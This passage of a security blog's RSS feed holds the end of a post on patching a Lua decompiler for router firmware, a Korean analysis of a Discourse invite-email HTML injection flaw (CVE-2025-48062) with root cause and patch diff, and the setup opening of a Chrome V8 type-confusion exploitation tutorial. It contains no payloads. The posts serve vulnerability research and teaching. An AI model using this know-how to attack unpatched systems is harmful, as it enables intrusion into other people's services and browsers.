&amp;f-&gt;k[i];<span class="hljs-keyword">switch</span> (ttype(o)) {<span class="hljs-keyword">case</span> LUA_TBOOLEAN:<span class="hljs-keyword">return</span> strdup(bvalue(o)?<span class="hljs-string">&quot;true&quot;</span>:<span class="hljs-string">&quot;false&quot;</span>);<span class="hljs-keyword">case</span> LUA_TNIL:<span class="hljs-keyword">return</span> strdup(<span class="hljs-string">&quot;nil&quot;</span>);<span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> LUA_VERSION_NUM == 501 || LUA_VERSION_NUM == 502</span><span class="hljs-keyword">case</span> LUA_TNUMBER:{<span class="hljs-keyword">char</span>* ret = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">calloc</span>(<span class="hljs-number">128</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>));<span class="hljs-built_in">sprintf</span>(ret, LUA_NUMBER_FMT, nvalue(o));<span class="hljs-keyword">return</span> ret;}<span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:  {      <span class="hljs-keyword">char</span>* ret = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">calloc</span>(<span class="hljs-number">128</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>));      <span class="hljs-built_in">sprintf</span>(ret, LUA_INTEGER_FMT, ivalue(o));       <span class="hljs-keyword">return</span> ret;  }<span class="hljs-keyword">case</span> LUA_TSTRING:</code></pre><p>After modifying the code to print the value as an integer, you can see that the error is resolved as shown below.</p><pre><code class="hljs lua"><span class="hljs-comment">-- params : ...</span><span class="hljs-comment">-- function num : 0</span><span class="hljs-built_in">module</span>(<span class="hljs-string">&quot;luci.controller.login&quot;</span>, <span class="hljs-built_in">package</span>.<span class="hljs-built_in">seeall</span>)<span class="hljs-keyword">local</span> l_0_0 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.model.controller&quot;</span>)<span class="hljs-keyword">local</span> l_0_1 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;nixio&quot;</span>)<span class="hljs-keyword">local</span> l_0_2 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;nixio.fs&quot;</span>)<span class="hljs-keyword">local</span> l_0_3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.sys&quot;</span>)<span class="hljs-keyword">local</span> l_0_4 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.util&quot;</span>)<span class="hljs-keyword">local</span> l_0_5 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.tools.error&quot;</span>)<span class="hljs-keyword">local</span> l_0_6 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.model.log&quot;</span>)<span class="hljs-keyword">local</span> l_0_7 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.tools.debug&quot;</span>)<span class="hljs-keyword">local</span> l_0_8 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.json&quot;</span>)<span class="hljs-keyword">local</span> l_0_9 = (<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.tools.datatypes&quot;</span>))<span class="hljs-keyword">local</span> l_0_10 = <span class="hljs-literal">nil</span><span class="hljs-keyword">local</span> l_0_11 = <span class="hljs-string">&quot;/var/run/luci-attempts.lock&quot;</span><span class="hljs-keyword">local</span> l_0_12 = <span class="hljs-string">&quot;/tmp/luci-attempts&quot;</span><span class="hljs-keyword">local</span> l_0_13 = <span class="hljs-string">&quot;/tmp/TIME_STAMP&quot;</span><span class="hljs-keyword">local</span> l_0_14 = <span class="hljs-number">7200</span><span class="hljs-keyword">local</span> l_0_15 = <span class="hljs-number">10</span><span class="hljs-keyword">local</span> l_0_16 = <span class="hljs-number">88</span><span class="hljs-keyword">local</span> l_0_17 = <span class="hljs-number">14201</span><span class="hljs-keyword">local</span> l_0_18 = <span class="hljs-number">14203</span><span class="hljs-keyword">local</span> l_0_19 = <span class="hljs-number">24</span><span class="hljs-keyword">local</span> l_0_20 = <span class="hljs-number">13242</span><span class="hljs-keyword">local</span> l_0_21 = <span class="hljs-number">13243</span><span class="hljs-keyword">local</span> l_0_22 = <span class="hljs-string">&quot;users&quot;</span><span class="hljs-keyword">local</span> l_0_23 = <span class="hljs-string">&quot;02008001&quot;</span><span class="hljs-keyword">local</span> l_0_24 = <span class="hljs-number">4</span><span class="hljs-keyword">local</span> l_0_25 = <span class="hljs-string">&quot;02108001&quot;</span><span class="hljs-keyword">local</span> l_0_31 = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(l_1_0)</span></span>...</code></pre><p>This allows us to interpret all the parts that were using uninterpreted variables.</p><p>The patched luadec tool can be found at the GitHub repository below!</p><p><a href="https://github.com/newp1ayer48/luadec-patched">https://github.com/newp1ayer48/luadec-patched</a></p><p>You can install and use it as follows.</p><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/newp1ayer48/luadec-patched.git<span class="hljs-built_in">cd</span> ./luadec-patched/luadecchmod +x ./luadec./luadec luaFile/lua</code></pre><p>The control flow analysis failure error is scheduled to be patched in the future. I plan to continue patching for custom Lua scripts from other products, devices, and environments as I encounter them.</p><p>When I first started analyzing the custom Lua, I felt quite lost. But as I analyzed the file and patched the tool, more and more parts became interpretable, which was very satisfying! I hope this article and the tool I patched can be helpful to others who are analyzing Lua files!</p><p>I&#x2019;ll be back with another embedded topic next time! Thanks for reading! &#x1F44B;&#x1F3FB;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Embedded/">Embedded</category>
      
      <category domain="https://hackyboiz.github.io/tags/Lua/">Lua</category>
      
      <category domain="https://hackyboiz.github.io/tags/luadec/">luadec</category>
      
      <category domain="https://hackyboiz.github.io/tags/luci/">luci</category>
      
      <category domain="https://hackyboiz.github.io/tags/openwrt/">openwrt</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/04/newp1ayer48/lua/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-48062: Discourse의 Topic 초대 시 전송되는 이메일을 통한 HTML Injection 취약점</title>
      <link>https://hackyboiz.github.io/2025/10/01/ji9umi/CVE-2025-48062/</link>
      <guid>https://hackyboiz.github.io/2025/10/01/ji9umi/CVE-2025-48062/</guid>
      <pubDate>Wed, 01 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Target&quot;&gt;&lt;a href=&quot;#Target&quot; class=&quot;headerlink&quot; title=&quot;Target&quot;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Discourse &amp;lt; 3.4.5&lt;/li&gt;
&lt;li&gt;Discourse &amp;lt; 3.5</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Discourse &lt; 3.4.5</li><li>Discourse &lt; 3.5.0.beta6</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><h3 id="background"><a href="#background" class="headerlink" title="background"></a>background</h3><p>Discourse&#xB294; <strong>&#xC624;&#xD508;&#xC18C;&#xC2A4; &#xAE30;&#xBC18; &#xCEE4;&#xBBA4;&#xB2C8;&#xD2F0; &#xD50C;&#xB7AB;&#xD3FC;</strong>&#xC73C;&#xB85C; GitLab, OpenAI &#xB4F1;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xC11C;&#xBE44;&#xC2A4;&#xC785;&#xB2C8;&#xB2E4;. CVE-2025-48062 &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; Topic &#xCD08;&#xB300;&#xB97C; &#xC704;&#xD55C; &#xC774;&#xBA54;&#xC77C; &#xC804;&#xC1A1; &#xC2DC; &#xD3EC;&#xD568;&#xB418;&#xB294; &#xB0B4;&#xC6A9;&#xC774; &#xBCC4;&#xB3C4;&#xC758; &#xD544;&#xD130;&#xB9C1; &#xC5C6;&#xC774; &#xC0BD;&#xC785;&#xB418;&#xC5B4; HTML Injection&#xC744; &#xC720;&#xBC1C;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h3><p>&#xC0C8;&#xB85C;&#xC6B4; Topic &#xCD08;&#xB300; &#xBA54;&#xC77C; &#xC0DD;&#xC131; &#xC694;&#xCCAD;&#xC774; &#xB4E4;&#xC5B4;&#xC624;&#xBA74; &#xB77C;&#xC6B0;&#xD305; &#xADDC;&#xCE59;&#xC5D0; &#xB530;&#xB77C; <em>app/controllers/invites_controller.rb</em> &#xD30C;&#xC77C;&#xC758; <code>create()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ruby"><span class="hljs-comment"># config/routes.rb</span>    resources <span class="hljs-symbol">:invites</span>, <span class="hljs-symbol">only:</span> %i[create update destroy]    get <span class="hljs-string">&quot;/invites/:id&quot;</span> =&gt; <span class="hljs-string">&quot;invites#show&quot;</span>, <span class="hljs-symbol">:constraints</span> =&gt; { <span class="hljs-symbol">format:</span> <span class="hljs-symbol">:html</span> }    post <span class="hljs-string">&quot;invites/create-multiple&quot;</span> =&gt; <span class="hljs-string">&quot;invites#create_multiple&quot;</span>, <span class="hljs-symbol">:constraints</span> =&gt; { <span class="hljs-symbol">format:</span> <span class="hljs-symbol">:json</span> }    <span class="hljs-comment"># app/controllers/invites_controller.rb</span>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span></span>    <span class="hljs-keyword">begin</span>      <span class="hljs-keyword">if</span> params[<span class="hljs-symbol">:topic_id</span>].present?        topic = Topic.find_by(<span class="hljs-symbol">id:</span> params[<span class="hljs-symbol">:topic_id</span>]) <span class="hljs-comment"># ----------&gt; Find Topic by topic_id</span>        raise Discourse::InvalidParameters.new(<span class="hljs-symbol">:topic_id</span>) <span class="hljs-keyword">if</span> topic.blank?        guardian.ensure_can_invite_to!(topic)      <span class="hljs-keyword">end</span><span class="hljs-comment"># ...</span>      invite =        Invite.generate( <span class="hljs-comment"># ------------&gt; Generate mail content</span>          current_user,          <span class="hljs-symbol">email:</span> params[<span class="hljs-symbol">:email</span>],          <span class="hljs-symbol">domain:</span> params[<span class="hljs-symbol">:domain</span>],          <span class="hljs-symbol">skip_email:</span> params[<span class="hljs-symbol">:skip_email</span>],          <span class="hljs-symbol">invited_by:</span> current_user,          <span class="hljs-symbol">custom_message:</span> params[<span class="hljs-symbol">:custom_message</span>],          <span class="hljs-symbol">max_redemptions_allowed:</span> params[<span class="hljs-symbol">:max_redemptions_allowed</span>],          <span class="hljs-symbol">topic_id:</span> topic&amp;.id,          <span class="hljs-symbol">group_ids:</span> groups&amp;.map(&amp;<span class="hljs-symbol">:id</span>),          <span class="hljs-symbol">expires_at:</span> params[<span class="hljs-symbol">:expires_at</span>],          <span class="hljs-symbol">invite_to_topic:</span> params[<span class="hljs-symbol">:invite_to_topic</span>],        )</code></pre><p>&#xC774;&#xB54C; &#xC804;&#xB2EC; &#xBC1B;&#xB294; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB294; <code>topic_id</code>&#xB85C; <code>Topic.find_by()</code> &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; ActiveRecord &#xC0C1;&#xC5D0; &#xC77C;&#xCE58;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. Topic&#xC774; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0; <code>Invite.generate()</code> &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD55C; email body &#xC0DD;&#xC131;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/01/ji9umi/CVE-2025-48062/image1.png" alt></p><p>&#xC704; &#xD750;&#xB984;&#xB3C4;&#xB294; &#xCEE8;&#xD2B8;&#xB864;&#xB7EC;&#xBD80;&#xD130; &#xC2E4;&#xC81C; body &#xB0B4;&#xC6A9;&#xC744; &#xC791;&#xC131;&#xD558;&#xB294; <code>body()</code> &#xD568;&#xC218;&#xAE4C;&#xC9C0;&#xC758; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xD750;&#xB984;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ruby"><span class="hljs-comment"># lib/email/message_builder.rb</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">body</span></span>      body = <span class="hljs-literal">nil</span>      <span class="hljs-keyword">if</span> @opts[<span class="hljs-symbol">:template</span>]        body = I18n.t(<span class="hljs-string">&quot;<span class="hljs-subst">#{@opts[<span class="hljs-symbol">:template</span>]}</span>.text_body_template&quot;</span>, template_args).dup <span class="hljs-comment"># --&gt; Set body content</span>      <span class="hljs-keyword">else</span>        body = @opts[<span class="hljs-symbol">:body</span>].dup      <span class="hljs-keyword">end</span>      <span class="hljs-keyword">if</span> @template_args[<span class="hljs-symbol">:unsubscribe_instructions</span>].present?        body &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>        body &lt;&lt; @template_args[<span class="hljs-symbol">:unsubscribe_instructions</span>]      <span class="hljs-keyword">end</span>      DiscoursePluginRegistry.apply_modifier(<span class="hljs-symbol">:message_builder_body</span>, body, @opts, @to)    <span class="hljs-keyword">end</span></code></pre><p>&#xD568;&#xC218;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xBCC4;&#xB3C4;&#xC758; &#xD544;&#xD130;&#xB9C1; &#xACFC;&#xC815; &#xC5C6;&#xC774; <code>@template_args</code> &#xB85C; &#xB118;&#xC5B4;&#xC628; &#xAC12;&#xC744; <code>body</code> &#xB0B4;&#xC6A9;&#xC5D0; &#xD3EC;&#xD568;&#xD569;&#xB2C8;&#xB2E4;. &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xC0C1;&#xC704; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC774;&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xB54C;&#xC5D0;&#xB3C4; &#xC720;&#xD6A8;&#xD55C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xAC80;&#xC99D;&#xC744; &#xC9C4;&#xD589;&#xD560; &#xBFD0;, &#xC545;&#xC131; &#xCF58;&#xD150;&#xCE20; &#xD3EC;&#xD568; &#xC5EC;&#xBD80;&#xB294; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ruby"><span class="hljs-comment"># app/mailers/invite_mailer.rb</span>    <span class="hljs-keyword">if</span> invite_to_topic &amp;&amp; first_topic.present?      <span class="hljs-comment"># get topic excerpt</span>      topic_excerpt = <span class="hljs-string">&quot;&quot;</span>      topic_excerpt = first_topic.excerpt.tr(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot; &quot;</span>) <span class="hljs-keyword">if</span> first_topic.excerpt      topic_title = first_topic.try(<span class="hljs-symbol">:title</span>) <span class="hljs-comment"># ----&gt; Get topic_title</span>      <span class="hljs-keyword">if</span> SiteSetting.private_email?        topic_title = I18n.t(<span class="hljs-string">&quot;system_messages.private_topic_title&quot;</span>, <span class="hljs-symbol">id:</span> first_topic.id)        topic_excerpt = <span class="hljs-string">&quot;&quot;</span>      <span class="hljs-keyword">end</span></code></pre><h3 id="patch-diffing"><a href="#patch-diffing" class="headerlink" title="patch diffing"></a>patch diffing</h3><p>3.5.0.beta6&#xC5D0;&#xC11C; &#xC801;&#xC6A9;&#xB41C; &#xD328;&#xCE58;&#xB97C; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574; 3.5.0.beta5&#xC640; &#xBE44;&#xAD50;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xBA74; commit &#xAE30;&#xB85D; &#xC911; <strong>&#x201C;SECURITY: Escape topic title for mailers&#x201D;</strong>&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; commit hash&#xB294; <code>72e224b7627b410a00afdd3fb185b3523518dadc</code>&#xB85C; &#x2018;<em>message_builder.rb&#x2019;</em>&#xC640; &#x2018;<em>message_builder_spec.rb&#x2019;</em> &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xC218;&#xC815;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#x2018;message_builder_spec.rb&#x2019; &#xD30C;&#xC77C;&#xC740; &#xAD6C;&#xD604;&#xB41C; &#xAE30;&#xB2A5;&#xC774; &#xC62C;&#xBC14;&#xB974;&#xAC8C; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD14C;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C;&#xB85C; &#xC2E4;&#xC81C; &#xAD6C;&#xD604;&#xC5D0;&#xB294; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAD00;&#xB828; &#xB0B4;&#xC6A9;&#xC740; <a href="https://rspec.info/">RSpec</a>&#xC5D0;&#xC11C; &#xCC38;&#xACE0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><pre><code class="hljs ruby"><span class="hljs-comment"># lib/email/message_builder.rb</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">body</span></span>      body = <span class="hljs-literal">nil</span>      <span class="hljs-keyword">if</span> @opts[<span class="hljs-symbol">:template</span>]        template_args_to_escape = %i[topic_title inviter_name]        template_args_to_escape.each <span class="hljs-keyword">do</span> <span class="hljs-params">|key|</span>          <span class="hljs-keyword">next</span> <span class="hljs-keyword">if</span> !@template_args.key?(key)          @template_args[key] = escaped_template_arg(key) <span class="hljs-comment"># --&gt; new mitigation function is called</span>        <span class="hljs-keyword">end</span><span class="hljs-comment"># ...</span>    private    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">escaped_template_arg</span><span class="hljs-params">(key)</span></span> <span class="hljs-comment"># -----&gt; new mitigation function</span>      value = template_args[key].dup      <span class="hljs-comment"># explicitly escaped twice, as Mailers will mark the body as html_safe</span>      once_escaped = String.new(ERB::Util.html_escape(value))      ERB::Util.html_escape(once_escaped)    <span class="hljs-keyword">end</span></code></pre><p>&#xBCC0;&#xACBD;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74; <code>body()</code> &#xD568;&#xC218;&#xC758; &#xCC98;&#xB9AC; &#xACFC;&#xC815; &#xC911; &#xC0C8;&#xB85C; &#xCD94;&#xAC00;&#xB41C; <code>escaped_template_arg()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC545;&#xC758;&#xC801;&#xC778; &#xB0B4;&#xC6A9;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC9C0; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="requirements"><a href="#requirements" class="headerlink" title="requirements"></a>requirements</h3><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xD53C;&#xD574;&#xC790;&#xC5D0;&#xAC8C; &#xCD08;&#xB300; &#xBA54;&#xC77C;&#xC744; &#xBCF4;&#xB0B4;&#xAE30; &#xC704;&#xD574; ActiveRecord &#xC0C1;&#xC5D0; &#xC720;&#xD6A8;&#xD55C; &#xD1A0;&#xD53D; &#xB0B4;&#xC6A9;&#xC774; &#xC874;&#xC7AC;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. Discourse&#xC5D0;&#xC11C; &#xD1A0;&#xD53D;&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC0C8;&#xB85C;&#xC6B4; &#xAC8C;&#xC2DC;&#xAE00;&#xC744; &#xB9CC;&#xB4DC;&#xB294; &#xAC83;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xAC1C;&#xB150;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9CC;&#xC57D; &#xC774; &#xACFC;&#xC815; &#xC911; &#xD2B9;&#xC815; &#xBB38;&#xC790;&#xC5F4;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC;&#xAC00; &#xC788;&#xB294; &#xACBD;&#xC6B0; &#xC6D0;&#xD65C;&#xD55C; exploit&#xC774; &#xBD88;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="limitations"><a href="#limitations" class="headerlink" title="limitations"></a>limitations</h3><p>Topic &#xC0DD;&#xC131; &#xACFC;&#xC815;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC0AC;&#xC774;&#xD2B8; &#xC124;&#xC815;&#xC5D0; &#xB530;&#xB978; &#xCD5C;&#xB300; &#xAE38;&#xC774;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"># app/assets/javascripts/discourse/app/services/composer.js    <span class="hljs-keyword">if</span> (      opts.topicTitle &amp;&amp;      opts.topicTitle.length &lt;= <span class="hljs-built_in">this</span>.siteSettings.max_topic_title_length    ) {      <span class="hljs-built_in">this</span>.model.set(<span class="hljs-string">&quot;title&quot;</span>, opts.topicTitle);    }</code></pre><p>&#xB530;&#xB77C;&#xC11C; payload &#xC791;&#xC131; &#xC2DC; &#xAE38;&#xC774; &#xC81C;&#xD55C;&#xC740; &#xC874;&#xC7AC;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xC774;&#xC678;&#xC5D0; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xAC80;&#xC99D;&#xC740; &#xD655;&#xC778;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Takeaways"><a href="#Takeaways" class="headerlink" title="Takeaways"></a>Takeaways</h2><p>&#xCD5C;&#xADFC; &#xB9CE;&#xC740; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB098; &#xBA54;&#xC77C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xACBD;&#xC6B0; client-side &#xACF5;&#xACA9;&#xC5D0; &#xB300;&#xD55C; &#xBCF4;&#xD638;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xC9C0;&#xB9CC; &#xC704;&#xC640; &#xAC19;&#xC740; &#xACF5;&#xACA9;&#xC740; &#xBD88;&#xD2B9;&#xC815; &#xB2E4;&#xC218;&#xC5D0;&#xAC8C; &#xC545;&#xC131; &#xBA54;&#xC77C;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xAD11;&#xBC94;&#xC704;&#xD55C; &#xD53C;&#xD574;&#xB97C; &#xC785;&#xD790; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC608;&#xBC29;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC5EC;&#xB7EC; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; escape &#xD568;&#xC218; &#xB610;&#xD55C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xB9CC;&#xD07C; &#xC801;&#xADF9; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48062">https://nvd.nist.gov/vuln/detail/CVE-2025-48062</a></li><li><a href="https://rspec.info/">https://rspec.info/</a></li><li><a href="https://meta.discourse.org/t/3-5-0-beta6-security-fixes-release/369346">https://meta.discourse.org/t/3-5-0-beta6-security-fixes-release/369346</a></li><li><a href="https://meta.discourse.org/t/3-4-5-security-fixes-release/369347">https://meta.discourse.org/t/3-4-5-security-fixes-release/369347</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ji9umi/">ji9umi</category>
      
      <category domain="https://hackyboiz.github.io/tags/Discourse/">Discourse</category>
      
      <category domain="https://hackyboiz.github.io/tags/HTML-Injection/">HTML Injection</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/01/ji9umi/CVE-2025-48062/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Starting Chrome Exploitation with Type Confusion 101 ^-^☆ Part 3.(EN)</title>
      <link>https://hackyboiz.github.io/2025/09/26/OUYA77/Chrome_part3/en/</link>
      <guid>https://hackyboiz.github.io/2025/09/26/OUYA77/Chrome_part3/en/</guid>
      <pubDate>Fri, 26 Sep 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello! OUYA77 here. 2025 is already heading into the fourth quarter. Take care not to catch a seasonal cold, and I hope you spend the res</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello! OUYA77 here. 2025 is already heading into the fourth quarter. Take care not to catch a seasonal cold, and I hope you spend the rest of the year without regrets &#x1F44D;.</p><p>In Part 1 We looked at Chrome&#x2019;s overall architecture, and in Part 2 I covered how a Type Confusion vulnerability arises in the V8 engine and why that can lead to a Relative R/W primitive.</p><blockquote><p>If you haven&#x2019;t read them<br>&#x2192; <a href="https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/en/">Starting Chrome Exploitation with Type Confusion 101 ^-^&#x2606; Part 1.</a><br>&#x2192; <a href="https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/en/">Starting Chrome Exploitation with Type Confusion 101 ^-^&#x2606; Part 2.</a></p></blockquote><p>This time I&#x2019;ll write a bit article and &#x2014; to get a real whiff of pwnable goodness &#x2014; I&#x2019;ll only recap the Relative R/W from last time and then look at the actual exploit payload used in practice! We&#x2019;ve got a lot to cover, so let&#x2019;s hurry :)</p><h2 id="0-Relative-R-W-Recap"><a href="#0-Relative-R-W-Recap" class="headerlink" title="0. Relative R/W Recap"></a>0. Relative R/W Recap</h2><p><img src="image.png" alt="image.png"></p><p>For performance, V8 relies on assumptions that objects&#x2019; structures won&#x2019;t change and therefore uses internal mechanisms like Hidden Classes (Maps) and ElementsKind. Based on that information, V8&#x2019;s JIT compiler TurboFan produces high-performance native code. But JavaScript is extremely dynamic, and <strong>if an object&#x2019;s structure or an array&#x2019;s type changes at runtime, those assumptions can be violated.</strong> If V8 fails to properly deoptimize the previously optimized code, the engine may access memory using incorrect type information &#x2014; and, as shown above, that can enable Relative R/W.</p><p>In this part we&#x2019;ll take the journey from using a historical Chrome version to get a Relative Address R/W primitive via Type Confusion, refine that into an Arbitrary Address R/W, and proceed toward code execution. This post covers vulnerabilities from the era before the Heap Sandbox.</p><h2 id="1-Environments-Set-up"><a href="#1-Environments-Set-up" class="headerlink" title="1. Environments Set-up"></a>1. Environments Set-up</h2><p>There&#x2019;s a well-written write-up for the set-up, so I won&#x2019;t go into a long explanation here &#x2014; I&#x2019;ll just add a few notes about the parts that mattered to me while doing it.</p><blockquote><p>Set-up link&#x2192; <a href="https://gist.github.com/jhalon/5cbaab99dccadbf8e783921358020159">https://gist.github.com/jhalon/5cbaab99dccadbf8e783921358020159</a></p></blockquote><p>Make sure the Windows SDK versions match exactly. In <code>depot_tools</code> there&#x2019;s a <code>python3.bat</code>; when you run <code>where python</code> in a cmd window, that <code>python3.bat</code> should be the one that appears. Create a symbolic link named <code>python.bat</code> that points to it, and put the <code>depot_tools</code> folder at the very top of your <code>PATH</code> environment variable. You&#x2019;ll need this for the build!</p><p>Finally, the build expects SDK <code>10.0.26100.0</code>, so check that version in the Visual Studio Installer and download it. (<code>tools\dev\gm.py x64.debug</code> has the version hardcoded, so it&#x2019;s best to match that version when you build.)</p><pre><code class="hljs jsx">c:\dev\source\v8&gt;python3 tools\dev\gm.py x64.debug# gn gen out\x64.debugDone. Made <span class="hljs-number">740</span> targets <span class="hljs-keyword">from</span> <span class="hljs-number">225</span> files <span class="hljs-keyword">in</span> <span class="hljs-number">6288</span>ms# autoninja -C out\x64.debug d8offline modeninja: Entering directory <span class="hljs-string">`out\x64.debug&apos;</span><span class="hljs-string">exec_root=C:\dev\source\v8 dir=out\x64.debug</span><span class="hljs-string">build finished</span><span class="hljs-string">local:2609 remote:0 cache:0 cache-write:0(err:0) fallback:0 retry:0 skip:312</span><span class="hljs-string">fs: ops: 41931(err:5273) / r:12710(err:0) 20.66GiB / w:122(err:0) 100.98MiB</span><span class="hljs-string"> resource/capa used(err)  